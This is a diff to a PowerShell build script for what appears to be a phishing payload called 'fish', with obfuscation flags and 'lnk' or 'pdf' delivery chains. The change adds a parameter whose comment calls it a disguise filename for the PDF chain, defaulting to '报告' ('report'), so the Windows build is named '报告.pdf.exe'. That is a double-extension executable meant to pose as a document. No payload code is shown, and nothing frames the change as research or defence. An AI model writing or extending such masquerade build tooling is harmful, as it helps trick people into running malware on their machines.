@@ -15,7 +15,8 @@ param(
     [string]$GarbleSeed = "",
     [switch]$SkipPost = $false,
     [ValidateSet("lnk", "pdf")]
-    [string]$Chain = "lnk"
+    [string]$Chain = "lnk",
+    [string]$PdfName = "报告"   # PDF链路的伪装文件名（不含扩展名）
 )
 
 $ErrorActionPreference = "Stop"
@@ -41,7 +42,7 @@ if ($Platform -eq "windows") {
 $gcflags = "all=-l -N"
 
 $outputName = if ($Platform -eq "windows") { 
-    if ($Chain -eq "pdf") { "fish_pdf.exe" } else { "fish.exe" }
+    if ($Chain -eq "pdf") { "$PdfName.pdf.exe" } else { "fish.exe" }
 } else { "fish_$Platform_$Arch" }
 
 # Select build target based on chain
